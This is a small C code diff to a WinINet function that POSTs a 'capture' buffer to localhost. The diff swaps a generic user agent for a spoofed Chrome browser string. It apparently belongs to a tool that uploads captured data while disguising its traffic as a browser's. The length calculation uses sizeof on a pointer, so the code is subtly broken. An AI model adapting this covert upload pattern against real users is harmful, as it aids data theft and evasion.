@@ -10,13 +10,16 @@ int post(char capture[]) {
     int captureByteLength = N * sizeof(capture);
 	
 	char* hdrs = "Content-Type: text/plain";
-	LPCSTR accept[2] = { "*/*", NULL };
+	LPCSTR accept[2] = { "text/plain", NULL };
 
-	HINTERNET hSession = InternetOpenA("http generic", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, INTERNET_FLAG_ASYNC);
+	HINTERNET hSession = InternetOpenA("Mozilla / 5.0 (Windows NT 10.0; Win64; x64) AppleWebKit / 537.36 (KHTML, like Gecko) Chrome / 92.0.4515.131 Safari / 537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, INTERNET_FLAG_ASYNC);
 	HINTERNET hConnect = InternetConnectA(hSession, "localhost", INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
 	HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/", NULL, NULL, accept, 0, 0);
 
 	bool send = HttpSendRequestA(hRequest, hdrs, strlen(hdrs), capture, captureByteLength);
+	//if (!send) {
+		//printf("%d", GetLastError());
+	//}
 
 	return 1;
 }
